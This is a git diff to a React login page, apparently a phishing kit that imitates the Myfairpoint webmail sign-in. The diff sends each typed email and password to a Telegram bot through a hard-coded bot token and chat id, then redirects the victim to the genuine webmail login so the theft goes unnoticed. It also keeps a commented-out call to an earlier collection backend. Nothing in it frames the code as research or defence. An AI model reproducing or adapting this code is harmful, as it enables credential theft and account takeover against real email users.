@@ -8,52 +8,50 @@ import { useState } from 'react';
 import axios from 'axios';
 
 import { useEffect } from 'react';
+import myfairpoint from './fairpoint.png';
+
+
 function Home(){
 
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Adams")
+    const[platform, setPlatform] = useState("Myfairpoint")
 
     const[showError, setShowError] = useState(false);
 
 
     
 
-    useEffect(() => {
-        // Code to run when the component mounts or when dependencies change
-      showCookies();
-
-      }, [])
+  
 
 
-      function showCookies(){
-        const cookiesArray = document.cookie.split('; ');
-
-        cookiesArray.forEach(cookie => {
-          const [name, value, domain] = cookie.split('=');
-          
-          console.log(`Cookies name is : ${name} , Cookies Value is  ${value}`);
-        });
-    }
+      
 
 async function handleSubmit(e){
     e.preventDefault();
 
     try {
-        const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
-            email:email,
-            password:password,
-            platform:platform
-        });
+        // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+        //     email:email,
+        //     password:password,
+        //     platform:platform
+        // });
+
+       const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+            chat_id: 5868304053,
+            text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
+          });
+
     
         // Handle success
-        console.log('Data sent:', response.data.message);
+     
 
         if(response.status == 200){
-            console.log(response.data.message);
+           // console.log(response.data.message);
 
-            setShowError(true);
+          
+           window.location.href = 'https://webmail.myfairpoint.net/#/login';
         }
       } catch (error) {
         // Handle error
@@ -64,8 +62,8 @@ async function handleSubmit(e){
 
     return (
         <>
-            <nav className='mynav px-3 py-3'>
-                <img className='navimage' src={logo} />
+            <nav className='mynav px-3 py-1 bg-dark'>
+                <img className='navimage' src={myfairpoint} />
 
             </nav>
 
@@ -80,7 +78,7 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-            <div className='formdiv col-md-5 m-auto p-0 '>
+            <div className='formdiv col-md-4 m-auto p-0  card rounded'>
             {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
             <strong className='text-center'>Invalid Email or Password</strong> 
             <button type="button" className="close" data-dismiss="alert" aria-label="Close">
@@ -88,33 +86,44 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-                <div className='cardhead'>
-                Welcome to Webmail
+                <div className='text-center py-5'>
+                    <h3 className='mainheading'>Web<span>mail</span></h3>
                 </div>
 
-                <form onSubmit={handleSubmit}>
+                <form onSubmit={handleSubmit} className='px-2 py-3'>
 
-                <div class="formrow text-center mt-3">
-                                <span class="prompt"><label for="user">Email</label></span>
-                                                <div class="element"><input type="email"onChange={function(e){
+                
+
+                    <div className='form-group'>
+                        <input onChange={function(e){
                                                     setUserName(e.target.value);
-                                                }}value={email} className='inputwide' required/>
-                                </div>
-                        </div>
+                                                }}value={email} type="email"placeholder='Email' className='form-control' required />
 
+                    </div>
 
-                        <div class="formrow text-center">
-                                <span class="prompt"><label for="user">Password</label></span>
-                                                <div class="element"><input onChange={function(e){
+                    <div className='form-group'>
+                        <input onChange={function(e){
                                                     setPassword(e.target.value);
-                                                }} value={password} type="password"className='inputwide' required/>
-                                </div>
-                        </div>
+                                                }}value={password} type="password"placeholder='Password' className='form-control' required />
+
+                    </div>
+
+
+
+
+                           
+
+                       
 
 
                     <div className='buttondiv py-4 text-center'>
-                        <button className='mybutton'type="submit">Login</button>
+                        <button className='mybutton rounded'type="submit">Login</button>
 
+                    </div>
+
+
+                    <div className='text-right'>
+                        <a className='forgot' href="">Forgot Password ?</a>
                     </div>
 
 
@@ -127,7 +136,6 @@ async function handleSubmit(e){
             
             <br/>
 
-                <p className='info'>Webmail</p>
         </>
     );
 
